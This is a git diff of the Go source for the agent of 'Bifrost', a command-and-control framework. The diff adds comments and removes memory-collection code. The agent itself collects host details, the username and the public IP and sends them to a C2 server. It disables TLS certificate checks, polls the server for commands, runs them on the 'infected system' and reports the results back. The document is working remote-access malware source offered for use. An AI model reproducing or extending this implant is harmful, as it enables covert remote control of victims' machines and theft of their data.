@@ -1,3 +1,15 @@
+/*
+Agent for Bifrost. Allows for remote code execution on infected systems using
+secure TLS encryption over the HTTPS protocol.
+
+Usage:
+
+  ./agent
+
+When agent receives commands it executes them on the system and then sends
+the result back to the Bifrost server.
+*/
+
 package main
 
 import (
@@ -14,28 +26,29 @@ import (
 	"time"
 
 	"github.com/shirou/gopsutil/host"
-	"github.com/shirou/gopsutil/mem"
 )
 
+// compile time variables
 var (
 	IP        = "127.0.0.1"
 	SleepTime = "10"
-	Jitter    = "0"
 )
 
+// info to send back to the Bifrost server
 type system_info struct {
 	Stats     *host.InfoStat
-	Memory    uint64 `json:"total"`
 	IP        string
 	USERNAME  string
 	SleepTime string
 }
 
+// Registers a agent to the Bifrost server, sending it the collected
+// system info and receiving back an agent id which it will use to
+// poll the server for commands.
 func register(serverIP string) string {
 	// Gather system info
 	stats, _ := host.Info()
 	user, _ := user.Current()
-	v, _ := mem.VirtualMemory()
 	// get ip
 	resp, _ := http.Get("http://api.ipify.org")
 	body, _ := ioutil.ReadAll(resp.Body)
@@ -43,7 +56,6 @@ func register(serverIP string) string {
 	// set info in the requests json
 	host_info := system_info{
 		stats,
-		v.Total,
 		ip,
 		user.Name,
 		SleepTime,
@@ -51,8 +63,6 @@ func register(serverIP string) string {
 	fmt.Printf("%s", user.Name)
 	postBody, _ := json.Marshal(host_info)
 	responseBody := bytes.NewBuffer(postBody)
-	//fmt.Printf("%s", serverIP)
-	//resp_register, _ := http.NewRequest(http.MethodGet, "http://"+serverIP+":5000/api/1.1/add_agent", responseBody)
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	resp_register, _ := http.Post("https://"+serverIP+"/api/1.1/register_agent", "application/json", responseBody)
 	resp_register.Close = true
@@ -61,6 +71,7 @@ func register(serverIP string) string {
 	return agent_id
 }
 
+// Polls the server for commands and executes them, sending back the result.
 func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
 	post_body, _ := json.Marshal(map[string]string{
 		"id": agent_id,
@@ -93,6 +104,8 @@ func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
 	}
 }
 
+// Main loop that runs indefinitely, sending and receiving commands
+// from the Bifrost C2 server.
 func main() {
 	agent_id := register(IP)
 	fmt.Printf("Agent ID: %s\n", agent_id)
